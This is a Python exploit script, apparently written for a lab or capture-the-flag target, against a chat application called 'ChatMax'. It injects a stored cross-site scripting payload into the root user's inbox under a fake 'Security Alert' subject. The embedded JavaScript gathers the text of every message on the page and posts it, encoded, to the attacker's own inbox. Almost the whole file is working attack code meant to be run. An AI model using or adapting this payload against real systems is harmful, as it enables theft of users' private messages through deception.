#!/usr/bin/env python3
import requests
import sys
import random

def scramble(s):
    """Encodes a string into the ChatMax hyphen-separated ASCII format."""
    return '-'.join(str(ord(c)) for c in s)

def send_exfil_message(attacker_user, attacker_pass, target="root", server="localhost", port=8080):
    
    # ----------------------------------------------------------------------
    # REVISED JAVASCRIPT PAYLOAD FOR RELIABILITY
    # We now send the exfiltration request using a POST method, 
    # which moves the stolen data (the 'msg' parameter) into the HTTP body, 
    # bypassing the problematic URL length limit of the GET method.
    # ----------------------------------------------------------------------
    js_payload = f"""<script>
    // 1. Find all messages
    var messages = document.querySelectorAll('textarea');
    var stolen = '';
    
    // 2. Concatenate all cleartext messages
    for(var i = 0; i < messages.length; i++) {{
        stolen += messages[i].value + '\\n---MESSAGE---\\n';
    }}
    
    // 3. Prepare the exfiltration parameters for the POST body
    var rand = Math.random().toString().replace('.', '');
    var exfil_data = 'EXFILTRATED: ' + stolen;
    
    // The message parameters are prepared as if they were a GET request, 
    // but we will send them in the POST body.
    var params = 'pw=' + chatmax.scramble('{attacker_pass}') +
                 '&un=' + chatmax.scramble('{attacker_user}') +
                 '&msg=' + chatmax.scramble(exfil_data) +
                 '&to=' + chatmax.scramble('{attacker_user}') + '.inbox';

    // 4. Send the data via POST (more reliable for large amounts of data)
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/$' + rand, true);
    
    // POST requires this header for standard form data
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
    
    xhr.send(params);
    </script>"""

    # Format as the full ChatMax message structure
    message = '{"from":"' + attacker_user + '","subject":"Security Alert: NEW MAIL","date":"2025-10-24","body":"' + js_payload.replace('"', '\\"').replace('\n', '\\n') + '"}'
    message += '//END_MSG//'
    
    # Pad to 16 bytes (required by ChatMax for AES block size)
    pad_needed = 16 - (len(message) % 16)
    if pad_needed > 0 and pad_needed != 16:
        message += '\x00' * pad_needed
        
    # ----------------------------------------------------------------------
    # Initial Message Injection (still uses GET method for simplicity)
    # ----------------------------------------------------------------------
    rand = str(random.random()).replace('.', '')
    # The URL for the initial injection is short, so GET is fine.
    url = f"http://{server}:{port}/${rand}?pw={scramble(attacker_pass)}&un={scramble(attacker_user)}&msg={scramble(message)}&to={scramble(target)}.inbox"

    print(f"Sending exfiltration payload to {target}...")
    
    try:
        response = requests.get(url, timeout=10)
        if "Msg Sent" in response.text:
            print("SUCCESS: Malicious message sent to root's inbox!")
            print(f"ACTION REQUIRED: Log in as root to trigger the payload, then check {attacker_user}'s inbox.")
            return True
        else:
            print(f"Unexpected response: {response.text[:200]}")
            return False
    except Exception as e:
        print(f"Error sending message: {e}")
        return False

if __name__ == '__main__':
    # Default credentials
    attacker = "inhibitor"
    password = "123456" 
    
    if len(sys.argv) > 2:
        attacker = sys.argv[1]
        password = sys.argv[2]
    elif len(sys.argv) > 1:
        attacker = sys.argv[1]
        
    send_exfil_message(attacker, password)
